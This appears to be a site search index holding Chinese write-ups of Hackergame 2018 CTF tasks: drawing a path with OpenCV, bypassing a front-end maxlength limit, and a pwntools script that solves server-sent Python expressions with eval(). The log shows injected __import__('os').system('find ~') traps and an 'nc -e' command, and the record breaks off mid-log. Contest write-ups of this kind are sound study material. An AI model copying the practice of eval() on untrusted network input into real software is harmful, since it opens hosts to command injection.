\u7136\u540e\u7528\u5bfc\u7ebf\u5c06\u9502\u7535\u6c60\u548c\u6fc0\u5149\u4e8c\u6781\u7ba1\u8fde\u63a5\u8d77\u6765\uff08\u8fd9\u4e00\u6b65\u7684\u76ee\u7684\u662f\u8ba9\u4e8c\u6781\u7ba1\u4eae\u8d77\u6765\uff0c\u4e0d\u60f3\u4e8c\u6781\u7ba1\u4eae\u8d77\u6765\u7684\u540c\u5b66\u53ef\u4ee5\u4e0d\u8fde\uff09\uff0c\u4e00\u4e2a\u7f8e\u5473\u7684\u732b\u54aa\u9065\u63a7\u5668\u5c31\u505a\u597d\u4e86\u3002 \u732b\u54aa\u9065\u63a7\u5668\u7684\u539f\u7406\u975e\u5e38\u7b80\u5355\uff01\u64b8\u732b\u5b66\u4f1a\u66fe\u7ecf\u6709\u8bba\u6587\u7ed9\u51fa\u8fc7\u7ed3\u8bba\uff1a\u6fc0\u5149\u7b14\u6307\u5411\u54ea\u91cc\uff0c\u732b\u54aa\u5c31\u4f1a\u8dd1\u5230\u54ea\u91cc\u3002 \u4e3a\u4e86\u62a5\u590d\u732b\u54aa\u628a\u81ea\u5df1\u7684\u4ee3\u7801\u6253\u4e71\uff08\u89c1\uff1a\u732b\u54aa\u4e0e\u952e\u76d8\uff09\uff0cD \u540c\u5b66\u628a\u732b\u54aa\u9065\u63a7\u5668\u7ed1\u5728\u53ef\u4ee5\u4e0a\uff08UP\uff09\u4e0b\uff08DOWN\uff09\u5de6\uff08LEFT\uff09\u53f3\uff08RIGHT\uff09\u79fb\u52a8\u7684\u4e09\u8f74\u673a\u68b0\u81c2\u4e0a\uff0c\u5f00\u59cb\u4f7f\u7528\u6811\u8393\u6d3e\uff08\u4e00\u6b3e\u57fa\u4e8e Linux \u7684\u5355\u7247\u673a\u8ba1\u7b97\u673a\uff09\u63a7\u5236\u4e09\u8f74\u673a\u68b0\u81c2\uff0c\u8fdb\u800c\u63a7\u5236\u732b\u54aa\u5728\u8349\u5730\u4e0a\u8dd1\u6765\u8dd1\u53bb\u3002 \u9644\u4ef6\u662f\u6811\u8393\u6d3e\u4e0a\u7559\u4e0b\u7684\u8c03\u8bd5\u8f93\u51fa\u4fe1\u606f\uff0c\u6211\u4eec\u8d76\u5230\u73b0\u573a\u65f6\u53ea\u5269\u4e0b\u8fd9\u4e2a\u4e86\u3002","title":"\u9898\u76ee"},{"location":"ctf_writeup/hackergame_2018/cat_remote/#_3","text":"\u6253\u5f00\u6587\u6863\u53d1\u73b0\u4e3a\u56db\u4e2a\u65b9\u5411\u7684\u5b57\u6bcd\uff0c\u731c\u60f3\u753b\u51fa\u8be5\u8def\u7ebf\u5373\u53ef\u83b7\u5f97flag\u3002\u5f88\u591a\u5de5\u5177\u53ef\u4ee5\u5b9e\u73b0\u8fd9\u4e00\u529f\u80fd\uff0c\u8fd9\u91cc\u4f7f\u7528OpenCV\u8f85\u52a9\u753b\u56fe\uff0c\u4f5c\u56fe\u540e\u5373\u53ef\u53d1\u73b0flag\u3002 \u5176\u4e2d\uff0c\u53d8\u91cfmap\u6784\u9020\u51fd\u6570\u53c2\u6570\u662f\u753b\u5e03\u7684\u5927\u5c0f\u7b49\u5c5e\u6027\uff0c\u53d8\u91cfrow\u548ccol\u662f\u8d77\u59cb\u7684\u4f4d\u7f6e\u5750\u6807\u3002\u5176\u6b21\uff0cswitch\u8bed\u53e5\u4e2d\u7684\u53cc\u5c42\u5faa\u73af\u662f\u4e3a\u4e86\u8ba9\u7ebf\u6761\u66f4\u7c97\u4e00\u4e9b\uff0c\u5ef6\u65f6\u5219\u662f\u4e3a\u4e86\u5c55\u793a\u52a8\u753b\u6548\u679c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 #include <iostream> #include <fstream> #include <opencv2/opencv.hpp> int main () { cv :: Mat map ( 256 , 768 , CV_8UC1 ); std :: ifstream inputFileStream ( \"seq.txt\" ); int row = 50 , col = 128 ; map . at < uchar > ( row , col ) = 255 ; std :: string line ; inputFileStream >> line ; for ( auto i : line ) { switch ( i ) { case 'U' : row -= 1 ; for ( int ir = - 1 ; ir < 1 ; ++ ir ) { for ( int ic = - 1 ; ic < 1 ; ++ ic ) { map . at < uchar > ( row + ir , col + ic ) = 255 ; } } break ; case 'D' : row += 1 ; for ( int ir = - 1 ; ir < 1 ; ++ ir ) { for ( int ic = - 1 ; ic < 1 ; ++ ic ) { map . at < uchar > ( row + ir , col + ic ) = 255 ; } } break ; case 'L' : col -= 1 ; for ( int ir = - 1 ; ir < 1 ; ++ ir ) { for ( int ic = - 1 ; ic < 1 ; ++ ic ) { map . at < uchar > ( row + ir , col + ic ) = 255 ; } } break ; case 'R' : col += 1 ; for ( int ir = - 1 ; ir < 1 ; ++ ir ) { for ( int ic = - 1 ; ic < 1 ; ++ ic ) { map . at < uchar > ( row + ir , col + ic ) = 255 ; } } break ; default : ; } cv :: waitKey ( 1 ); cv :: imshow ( \"MAP\" , map ); } cv :: imshow ( \"MAP\" , map ); cv :: waitKey ( 0 ); return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/hackergame_2018/hello_world/","text":"\u7b7e\u5230\u9898 \u9898\u76ee SOURCE: https://hack2018.lug.ustc.edu.cn/#qiandao \u4e0d\u7528\u627e\u4e86\uff01\u7b7e\u5230\u9898\u6211\u5df2\u7ecf\u653e\u8fd9\u91cc\u4e86\uff01 \u89e3\u51b3\u65b9\u6848 \u6559\u5b66\u9898\uff0c\u6253\u5f00\u9898\u76ee\u9875\u9762\u540e\uff0c\u6309\u7167\u9898\u76ee\u63cf\u8ff0\uff0c\u63d0\u4ea4hackergame2018\u5373\u53ef\u83b7\u5f97flag\u3002 \u968f\u540e\u53d1\u73b0\u6709\u957f\u5ea6\u9650\u5236\u3002\u53f3\u51fb\u8f93\u5165\u6846\u5f00\u59cb\u5ba1\u67e5/\u68c0\u67e5\uff0c\u6216\u662fF12\u542f\u52a8\u5f00\u53d1\u8005\u5de5\u5177\uff1a \u76f4\u63a5\u53cc\u51fbmaxlength\u5c06\u5176\u5220\u9664\uff0c\u5373\u53ef\u8f93\u5165\u5269\u4f59\u76848\u3002 \u56de\u5230\u9898\u76ee\u5217\u8868\u9875\u9762\u63d0\u4ea4flag\u5373\u53ef\u3002\u672c\u9898\u4e5f\u53ef\u76f4\u63a5\u53d1\u5305\u7b49\u65b9\u6cd5\u89e3\u51b3\uff0c\u524d\u7aef\u4e0a\u505a\u9650\u5236\u662f\u6bd4\u8f83\u6ca1\u6709\u7528\u7684\uff0c\u5728\u540e\u7aef\u4e0a\u8fdb\u884c\u9650\u5236\u66f4\u4e3a\u73b0\u5b9e\u3002","title":"\u7b7e\u5230\u9898"},{"location":"ctf_writeup/hackergame_2018/hello_world/#_1","text":"","title":"\u7b7e\u5230\u9898"},{"location":"ctf_writeup/hackergame_2018/hello_world/#_2","text":"SOURCE: https://hack2018.lug.ustc.edu.cn/#qiandao \u4e0d\u7528\u627e\u4e86\uff01\u7b7e\u5230\u9898\u6211\u5df2\u7ecf\u653e\u8fd9\u91cc\u4e86\uff01","title":"\u9898\u76ee"},{"location":"ctf_writeup/hackergame_2018/hello_world/#_3","text":"\u6559\u5b66\u9898\uff0c\u6253\u5f00\u9898\u76ee\u9875\u9762\u540e\uff0c\u6309\u7167\u9898\u76ee\u63cf\u8ff0\uff0c\u63d0\u4ea4hackergame2018\u5373\u53ef\u83b7\u5f97flag\u3002 \u968f\u540e\u53d1\u73b0\u6709\u957f\u5ea6\u9650\u5236\u3002\u53f3\u51fb\u8f93\u5165\u6846\u5f00\u59cb\u5ba1\u67e5/\u68c0\u67e5\uff0c\u6216\u662fF12\u542f\u52a8\u5f00\u53d1\u8005\u5de5\u5177\uff1a \u76f4\u63a5\u53cc\u51fbmaxlength\u5c06\u5176\u5220\u9664\uff0c\u5373\u53ef\u8f93\u5165\u5269\u4f59\u76848\u3002 \u56de\u5230\u9898\u76ee\u5217\u8868\u9875\u9762\u63d0\u4ea4flag\u5373\u53ef\u3002\u672c\u9898\u4e5f\u53ef\u76f4\u63a5\u53d1\u5305\u7b49\u65b9\u6cd5\u89e3\u51b3\uff0c\u524d\u7aef\u4e0a\u505a\u9650\u5236\u662f\u6bd4\u8f83\u6ca1\u6709\u7528\u7684\uff0c\u5728\u540e\u7aef\u4e0a\u8fdb\u884c\u9650\u5236\u66f4\u4e3a\u73b0\u5b9e\u3002","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/hackergame_2018/python_simulator/","text":"\u732b\u54aa\u514b\u661f \u9898\u76ee SOURCE: https://hack2018.lug.ustc.edu.cn/#python_simulator \u901a\u77e5\uff1a\u5df2\u53d1\u5e03\u5907\u7528\u5730\u5740\u3002 \u4f17\u6240\u5468\u77e5\uff0c\u732b\u6015\u9ec4\u74dc \u4f60\u77e5\u9053\u732b\u54aa\u4e3a\u4ec0\u4e48\u6015\u9ec4\u74dc\u5417\uff1f \u6709\u4e00\u79cd\u8bf4\u6cd5\u662f\u8fd9\u662f\u732b\u5bf9\u86c7\u7684\u539f\u59cb\u6050\u60e7\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u4e1c\u897f\u8db3\u591f\u50cf\u86c7\uff0c\u90a3\u4e48\u732b\u54aa\u5c31\u4f1a\u6015\u5b83\u3002 \u8fdb\u4e00\u6b65\uff0c\u5982\u679c\u4f60\u8db3\u591f\u50cf\u86c7\uff0c\u732b\u5c31\u4f1a\u6015\u4f60\u3002 \u4e0b\u9762\u6211\u4eec\u6765\u626e\u6f14\u87d2\u86c7\uff08Python\uff09\u53bb\u5413\u732b\u3002 \u87d2\u86c7\u662f\u4e00\u79cd\u975e\u5e38\u5bb9\u6613\u4f7f\u7528\u7684\u7f16\u7a0b\u8bed\u8a00\uff0c\u8003\u9a8c\u4f60\u50cf\u4e0d\u50cf\u87d2\u86c7\u7684\u6807\u51c6\u5c31\u662f\u7ed9\u4f60\u4e00\u4e9b Python 3 \u8868\u8fbe\u5f0f\u3002\u5982\u679c\u4f60\u80fd\u6b63\u786e\u8ba1\u7b97\u51fa\u6765\uff0c\u4f60\u5c31\u901a\u8fc7\u4e86\u9a8c\u8bc1\u3002 \u8d76\u5feb\u4f7f\u7528\u547d\u4ee4 nc 202.38.95.46 12009 \u6765\u5f00\u59cb\u5427 \u5907\u7528\u5730\u5740\uff1anc 202.38.95.47 12009 \u89e3\u51b3\u65b9\u6848 nc\u540e\u53d1\u73b0\u662f\u9700\u8981\u572830\u79d2\u5185\u6c42\u89e3\u591a\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\uff0c\u51b3\u5b9a\u76f4\u63a5eval()\u89e3\u51b3\u3002\u968f\u540e\u53d1\u73b0\u6709\u8868\u8fbe\u5f0f\u5939\u5e26\u4e86\u4e00\u4e9b\u5e72\u6270\u7684\u51fd\u6570\uff0c\u9700\u8981\u5728\u8fd0\u7b97\u524d\u5148\u8fc7\u6ee4\u6389\u3002 \u8fd9\u91cc\u4f7f\u7528\u4e86pwntools\uff0c\u4e8b\u5b9e\u4e0a\u4e5f\u53ef\u4ee5\u4e0d\u7528\u5b83\uff0c\u5199\u597d\u4e4b\u540e\u5229\u7528nc\uff1a \u5c06\u4ee5\u4e0a\u4ee3\u7801\u4fdd\u5b58\u4e3a sol.py \u7136\u540e\u6267\u884c nc -e ./sol.py 202.38.95.46 12009 \u6216\u8005 socat exec:./sol.py tcp:202.38.95.46:12009 -- hackergame2018-writeups README.md at master \u00b7 ustclug hackergame2018-writeups \u8fd9\u91cc\u662f\u4ee3\u7801\uff0c\u73af\u5883\u662fWindows 10 + IntelliJ IDEA (with Python plugin) + Kali Linux (WSL)\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from pwn import * def function_filter ( string ): if 'flag' in string : print ( string ) conn . close () exit ( 0 ) string = string . replace ( r \"print('\\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a')\" , 'None' ) string = string . replace ( 'exit()' , 'None' ) string = string . replace ( '__import__( \\' time \\' ).sleep(100)' , 'None' ) string = string . replace ( '__import__( \\' os \\' ).system( \\' find ~ \\' )' , 'None' ) return string conn = remote ( '202.38.95.46' , 12009 ) print ( conn . recvline ()) while True : expression = conn . recvline () print ( expression ) expression = function_filter ( expression ) print ( expression ) result = str ( eval ( expression )) + ' \\n ' conn . send ( result ) print ( result ) \u4e0b\u65b9\u662f\u7ec8\u7aef\u7684\u8bb0\u5f55\uff0c\u6e38\u5ba2\u6b62\u6b65\uff08\u6ed1\u7a3d.jpg\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 C :\\ Users \\ domain \\ AppData \\ Local \\ Microsoft \\ WindowsApps \\ kali . exe run \" export PYTHONUNBUFFERED=1 && export PYCHARM_MATPLOTLIB_PORT=63169 && export PYTHONPATH=/mnt/c/Users/domain/IdeaProjects/pwntools:/mnt/c/Users/domain/.IntelliJIdea2018.3/config/plugins/python/helpers/pycharm_matplotlib_backend && export PYCHARM_HOSTED=1 && export PYTHONIOENCODING=UTF-8 && cd /mnt/c/Users/domain/IdeaProjects/pwntools && /usr/bin/python /mnt/c/Users/domain/IdeaProjects/pwntools/main.py \" [ x ] Opening connection to 202 . 38 . 95 . 46 on port 12009 [ x ] Opening connection to 202 . 38 . 95 . 46 on port 12009 : Trying 202 . 38 . 95 . 46 [ + ] Opening connection to 202 . 38 . 95 . 46 on port 12009 : Done You have only 30 seconds ((( 117 ** 10 ) ^ ( 20 >> 4 )) * (( 112 & 56 ) + int ( 17 <= 45 ))) ((( 117 ** 10 ) ^ ( 20 >> 4 )) * (( 112 & 56 ) + int ( 17 <= 45 ))) 23553459107299463524952 ((( 76 + 113 ) * ( 4 - 7 )) - (( 3 & 5 ) * ( 120 - 10 ))) ((( 76 + 113 ) * ( 4 - 7 )) - (( 3 & 5 ) * ( 120 - 10 ))) - 677 ((( 19 ^ 58 ) & ( 25 - 2 )) & (( 2 ** 47 ) * ( 55 ^ 68 ))) ((( 19 ^ 58 ) & ( 25 - 2 )) & (( 2 ** 47 ) * ( 55 ^ 68 ))) 0 (( int ( 7 >= 11 ) + ( 4 ^ 19 )) & ( int ( 9 != 95 ) + ( 82 - 1 ))) (( int ( 7 >= 11 ) + ( 4 ^ 19 )) & ( int ( 9 != 95 ) + ( 82 - 1 ))) 18 ((( 59 | 17 ) - int ( 72 != 4 )) ^ (( 7 | 132 ) + ( 1 >> 4 ))) ((( 59 | 17 ) - int ( 72 != 4 )) ^ (( 7 | 132 ) + ( 1 >> 4 ))) 189 ((( 8 >> 9 ) | ( 1 & 21 )) | int (( 5 - 140 ) > ( 117 * 8 ))) ((( 8 >> 9 ) | ( 1 & 21 )) | int (( 5 - 140 ) > ( 117 * 8 ))) 1 (( int ( 9 == 39 ) + ( 2 << 42 )) * (( 2 ** 23 ) | int ( 85 != 34 ))) (( int ( 9 == 39 ) + ( 2 << 42 )) * (( 2 ** 23 ) | int ( 85 != 34 ))) 73786985090931228672 ( int (( 8 & 8 ) <= int ( 10 != 66 )) * int (( 23 * 1 ) < ( 112 ^ 71 ))) ( int (( 8 & 8 ) <= int ( 10 != 66 )) * int (( 23 * 1 ) < ( 112 ^ 71 ))) 0 (( int ( 15 == 14 ) + ( 87 >> 1 )) + (( 25 ** 111 ) + int ( 1 < 68 ))) (( int ( 15 == 14 ) + ( 87 >> 1 )) + (( 25 ** 111 ) + int ( 1 < 68 ))) 148368246027496855429269410461905580534702591150311640098121562356703253603825174359892483308928337501453556765440046361081982695395709015429019927978515669 ( int (( 10 + 110 ) != ( 82 << 89 )) * (( 23 | 23 ) | int ( 6 < 57 ))) ( int (( 10 + 110 ) != ( 82 << 89 )) * (( 23 | 23 ) | int ( 6 < 57 ))) 23 int (( int ( 1 >= 11 ) & ( 18 + 11 )) != int (( 6 | 4 ) >= int ( 116 > 4 ))) int (( int ( 1 >= 11 ) & ( 18 + 11 )) != int (( 6 | 4 ) >= int ( 116 > 4 ))) 1 (( int ( 140 > 4 ) | ( 50 ^ 49 )) - (( 7 + 16 ) ^ ( 23 + 110 ))) (( int ( 140 > 4 ) | ( 50 ^ 49 )) - (( 7 + 16 ) ^ ( 23 + 110 ))) - 143 int ( int (( 37 >> 56 ) != ( 24 * 21 )) >= (( 31 | 3 ) * ( 15 << 31 ))) int ( int (( 37 >> 56 ) != ( 24 * 21 )) >= (( 31 | 3 ) * ( 15 << 31 ))) 0 ((( 12 ** 1 ) - ( 1 * 43 )) ^ (( 138 & 5 ) ^ ( 86 * 59 ))) ((( 12 ** 1 ) - ( 1 * 43 )) ^ (( 138 & 5 ) ^ ( 86 * 59 ))) - 5069 int ( int (( 16 | 1 ) != ( 4 * 4 )) < (( 138 ** 39 ) + ( 2 | 79 ))) int ( int (( 16 | 1 ) != ( 4 * 4 )) < (( 138 ** 39 ) + ( 2 | 79 ))) 1 int ((( 39 ** 2 ) + ( 19 | 6 )) != ( int ( 6 <= 2 ) & ( 68 * 50 ))) int ((( 39 ** 2 ) + ( 19 | 6 )) != ( int ( 6 <= 2 ) & ( 68 * 50 ))) 1 ((( 37 - 2 ) - ( 3 >> 30 )) + (( 15 - 27 ) ^ ( 47 * 3 ))) ((( 37 - 2 ) - ( 3 >> 30 )) + (( 15 - 27 ) ^ ( 47 * 3 ))) - 100 ((( 23 + 100 ) | int ( 67 <= 135 )) - (( 97 - 19 ) - ( 2 | 9 ))) ((( 23 + 100 ) | int ( 67 <= 135 )) - (( 97 - 19 ) - ( 2 | 9 ))) 56 int (( int ( 48 <= 77 ) ^ ( 6 - 2 )) <= int (( 104 + 5 ) > ( 17 | 2 ))) int (( int ( 48 <= 77 ) ^ ( 6 - 2 )) <= int (( 104 + 5 ) > ( 17 | 2 ))) 0 (( int ( 15 != 34 ) * ( 68 ** 1 )) * (( 37 | 11 ) | ( 19 * 4 ))) (( int ( 15 != 34 ) * ( 68 ** 1 )) * (( 37 | 11 ) | ( 19 * 4 ))) 7548 ( int (( 15 - 9 ) <= ( 36 >> 45 )) ^ (( 15 | 101 ) - ( 29 << 21 ))) ( int (( 15 - 9 ) <= ( 36 >> 45 )) ^ (( 15 | 101 ) - ( 29 << 21 ))) - 60817297 ((( 2 << 64 ) * ( 47 & 9 )) - int (( 23 >> 1 ) > ( 49 & 1 ))) ((( 2 << 64 ) * ( 47 & 9 )) - int (( 23 >> 1 ) > ( 49 & 1 ))) 332041393326771929087 ((( 6 | 59 ) + ( 1 >> 8 )) | (( 1 ^ 2 ) + int ( 5 > 28 ))) ((( 6 | 59 ) + ( 1 >> 8 )) | (( 1 ^ 2 ) + int ( 5 > 28 ))) 63 ((( 2 * 21 ) + int ( 34 <= 65 )) & (( 106 ^ 2 ) - int ( 114 >= 5 ))) ((( 2 * 21 ) + int ( 34 <= 65 )) & (( 106 ^ 2 ) - int ( 114 >= 5 ))) 35 ((( 11 >> 45 ) + ( 1 + 7 )) ^ (( 2 & 5 ) - ( 22 * 29 ))) ((( 11 >> 45 ) + ( 1 + 7 )) ^ (( 2 & 5 ) - ( 22 * 29 ))) - 630 ((( 109 ** 1 ) + ( 1 + 38 )) - ( int ( 24 == 1 ) + ( 4 ^ 102 ))) ((( 109 ** 1 ) + ( 1 + 38 )) - ( int ( 24 == 1 ) + ( 4 ^ 102 ))) 50 ((( 56 << 4 ) + ( 1 * 3 )) - (( 1 + 2 ) * ( 2 << 1 ))) ((( 56 << 4 ) + ( 1 * 3 )) - (( 1 + 2 ) * ( 2 << 1 ))) 887 int ( int ( int ( 25 != 9 ) == ( 63 | 21 )) >= (( 7 ** 143 ) | ( 13 - 1 ))) int ( int ( int ( 25 != 9 ) == ( 63 | 21 )) >= (( 7 ** 143 ) | ( 13 - 1 ))) 0 ((( 10 << 2 ) | ( 1 ^ 79 )) - int (( 1 * 83 ) == ( 13 | 31 ))) ((( 10 << 2 ) | ( 1 ^ 79 )) - int (( 1 * 83 ) == ( 13 | 31 ))) 110 ((( 114 >> 1 ) ^ ( 4 | 13 )) | (( 3 ^ 9 ) ^ int ( 12 <= 1 ))) ((( 114 >> 1 ) ^ ( 4 | 13 )) | (( 3 ^ 9 ) ^ int ( 12 <= 1 ))) 62 (( 2342064000130989726458922265734505037 * 378101797641765074633697655 ) * ( 361209203089064608726475229 + 7405120403093238288678324066 )) (( 2342064000130989726458922265734505037 * 378101797641765074633697655 ) * ( 361209203089064608726475229 + 7405120403093238288678324066 )) 6877384713710666667629989990116701071335793976166078686609796185338000890158903577053294325 (( 113013673117091000778178561732 * 95568362858979441195778255590311 ) - ( 88442375602257996324134996385167433520 & 62868084756973658540 )) (( 113013673117091000778178561732 * 95568362858979441195778255590311 ) - ( 88442375602257996324134996385167433520 & 62868084756973658540 )) 10800531720480242930912425663531210138715873070864972025722044 (( 145936223963731625770596791 + 185713060458974767541446220 ) + ( 4222634439223833111865710 * 3392216678742463229433662535331800569 )) (( 145936223963731625770596791 + 185713060458974767541446220 ) + ( 4222634439223833111865710 * 3392216678742463229433662535331800569 )) 14324090972967414859623430900997497001948960545759326541632001 (( 84972644075679862290670715462665 * 103021483480991156265050026263275 ) | ( 44952701858967169121145720212041581823 ^ 255751100351771662533209477680641057410 )) (( 84972644075679862290670715462665 * 103021483480991156265050026263275 ) | ( 44952701858967169121145720212041581823 ^ 255751100351771662533209477680641057410 )) 8754007847978793971280484377445805527446467229541149285815936639 (( 33706913853048835239844769389329689996 + 50223072051652617964930100 ) - ( 776098864387100527577058636019 * 41914530355020436818724 )) (( 33706913853048835239844769389329689996 + 50223072051652617964930100 ) - ( 776098864387100527577058636019 * 41914530355020436818724 )) - 32529819409849980818454667134821017070608431705399660 (( 609107414927851004765313477228853 * 4609189832345529105105 ) + ( 44242032082536560320526569891 + 4532349031470909972957799190895 )) (( 609107414927851004765313477228853 * 4609189832345529105105 ) + ( 44242032082536560320526569891 + 4532349031470909972957799190895 )) 2807491703691720204768111277944190194400910650701355351 (( 9544933787035660979503569177 * 592421544580584592481334917 ) * ( 505348518123734519777552 + 65822681674718855298 )) (( 9544933787035660979503569177 * 592421544580584592481334917 ) * ( 505348518123734519777552 + 65822681674718855298 )) 2857928272237953910975662857011108998182100402617886833182207854162345028600650 (( 7380017427798032412770 + 35334842329192425627081629390291984 ) & ( 1366990497679564417298 * 3296636763745755994475404561097597351 )) (( 7380017427798032412770 + 35334842329192425627081629390291984 ) & ( 1366990497679564417298 * 3296636763745755994475404561097597351 )) 22232385606198111341494938769167410 (( 141995336294035175708956637011 * 187366860768591824486511158544744925 ) + ( 22367856812360691672498640395 + 210602812480947398948415934594364 )) (( 141995336294035175708956637011 * 187366860768591824486511158544744925 ) + ( 22367856812360691672498640395 + 210602812480947398948415934594364 )) 26605220405193862192943690539580261509112670006704313883242653934 (( 70836351337739408621837 + 1874685452344475957897528642716425883 ) & ( 8151629790404072067196674 - 27196440084071133300253565 )) (( 70836351337739408621837 + 1874685452344475957897528642716425883 ) & ( 8151629790404072067196674 - 27196440084071133300253565 )) 1874685452327014399073896116720272256 (( 24744306292528480818278390709 + 5805547731358322244445555660 ) - ( 971618688495883190384856 | 3760032423462507564926375393391 )) (( 24744306292528480818278390709 + 5805547731358322244445555660 ) - ( 971618688495883190384856 | 3760032423462507564926375393391 )) - 3729482577205633670012168196478 (( 8398600763738495349603642 | 1155519235100868704271 ) | ( 27199893292190962969096 * 88981316175045359827744 )) (( 8398600763738495349603642 | 1155519235100868704271 ) | ( 27199893292190962969096 * 88981316175045359827744 )) 2420282304959939516913559041283377383092518207 (( 35324944215400258167990733916637587766 & 7770679375413997193116 ) * ( 256442899747653838817208722315070 & 123925610385160486864515013204011 )) (( 35324944215400258167990733916637587766 & 7770679375413997193116 ) * ( 256442899747653838817208722315070 & 123925610385160486864515013204011 )) 432905542325841850415209331948719374413651045239811400 (( 86441699007994596136488821368 - 211041053003450504820304656261068535830 ) * ( 764096034319107803870486907234176520 ^ 58581554248773693765830335 )) (( 86441699007994596136488821368 - 211041053003450504820304656261068535830 ) * ( 764096034319107803870486907234176520 ^ 58581554248773693765830335 )) - 161255631600092160272117746666659784649763319557521843071009908335767004146 (( 4289195557597593138303548133289576 + 115017951165933371898675 ) | ( 32451943224011858991537799613456359 | 2153309926101191365913144446 )) (( 4289195557597593138303548133289576 + 115017951165933371898675 ) | ( 32451943224011858991537799613456359 | 2153309926101191365913144446 )) 35442985886133230507689008307372031 (( 102800550573556488577786059198047 & 80308527076794542751150603743060963 ) - ( 54587948785806923184254167764557 + 25517554994617992404094670 )) (( 102800550573556488577786059198047 & 80308527076794542751150603743060963 ) - ( 54587948785806923184254167764557 + 25517554994617992404094670 )) 46825983837761492633239681492264 (( 20530431492961202111 + 11199809485808950052486 ) + ( 329069401236321119829 | 485820696747399959692950677505850946 )) (( 20530431492961202111 + 11199809485808950052486 ) + ( 329069401236321119829 | 485820696747399959692950677505850946 )) 485820696747411184933088183413683356 (( 58373691633537615632558 * 58258985603424552098189229043792204 ) | ( 208201628336283961011 - 12025934969159743065593123957 )) (( 58373691633537615632558 * 58258985603424552098189229043792204 ) | ( 208201628336283961011 - 12025934969159743065593123957 )) - 264285131736614294157052994 (( 2007980238835152837969 - 716638003903442234482 ) + ( 63580591357115748122 - 3496109116544692112505409675923 )) (( 2007980238835152837969 - 716638003903442234482 ) + ( 63580591357115748122 - 3496109116544692112505409675923 )) - 3496109115189769286216583324314 (( 3065564173080561341800995219 & 312808552469993092941 ) - ( 5385836407671206191986388387 * 144832855054824025836656 )) (( 3065564173080561341800995219 & 312808552469993092941 ) - ( 5385836407671206191986388387 * 144832855054824025836656 )) - 780046063781237928445235496773921921400032064440911 ( int ( int ( 5 < 13 ) < int ( int ( 34 == __import__ ( ' os ' ) . system ( ' find ~ ' )) > 9 )) * int ( int ( 1 <= 26 ) >= ( 1 | 3 ))) ( int ( int ( 5 < 13 ) < int ( int ( 34 == None ) > 9 )) * int ( int ( 1 <= 26 ) >= ( 1 | 3 ))) 0 ((( 1 * 43 ) ^ ( int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) != 1 ) | 7 )) ^ ( int ( 41 >= int ( 3 == __import__ ( ' time ' ) . sleep ( 100 ))) | int ( 45 != 101 ))) ((( 1 * 43 ) ^ ( int ( None != 1 ) | 7 )) ^ ( int ( 41 >= int ( 3 == None )) | int ( 45 != 101 ))) 45 ((( int ( exit () != 86 ) + int ( exit () == 86 )) & ( 1 ** 83 )) ^ int ( int ( 66 != int ( 1 == exit ())) < ( 22 - 24 ))) ((( int ( None != 86 ) + int ( None == 86 )) & ( 1 ** 83 )) ^ int ( int ( 66 != int ( 1 == None )) < ( 22 - 24 ))) 1 ((( 15 & 28 ) & int ( 3 > int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) == 1 ))) | int (( 5 ** 15 ) != ( 60 ** int ( 1 == print ( ' \\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a ' ))))) ((( 15 & 28 ) & int ( 3 > int ( None == 1 ))) | int (( 5 ** 15 ) != ( 60 ** int ( 1 == None )))) 1 int ((( 3 & 39 ) & ( int ( 36 != exit ()) << 127 )) != (( 3 & 132 ) & ( 94 * 38 ))) int ((( 3 & 39 ) & ( int ( 36 != None ) << 127 )) != (( 3 & 132 ) & ( 94 * 38 ))) 0 int ((( 26 >> 4 ) * ( 2 >> 12 )) == (( 6 * 88 ) ^ ( int ( 6 == __import__ ( ' time ' ) . sleep ( 100 )) >> 147 ))) int ((( 26 >> 4 ) * ( 2 >> 12 )) == (( 6 * 88 ) ^ ( int ( 6 == None ) >> 147 ))) 0 int ((( 17 - 23 ) + ( 1 - int ( 4 == __import__ ( ' time ' ) . sleep ( 100 )))) < (( 8 | 47 ) & ( 3 - int ( 2 != __import__ ( ' os ' ) . system ( ' find ~ ' ))))) int ((( 17 - 23 ) + ( 1 - int ( 4 == None ))) < (( 8 | 47 ) & ( 3 - int ( 2 != None )))) 1 int ((( 11 ^ 2 ) * int ( 7 < 1 )) <= ( int ( int ( __import__ ( ' os ' ) . system ( ' find ~ ' ) == 6 ) == 127 ) - ( int ( exit () != 1 ) & int ( 1 != exit ())))) int ((( 11 ^ 2 ) * int ( 7 < 1 )) <= ( int ( int ( None == 6 ) == 127 ) - ( int ( None != 1 ) & int ( 1 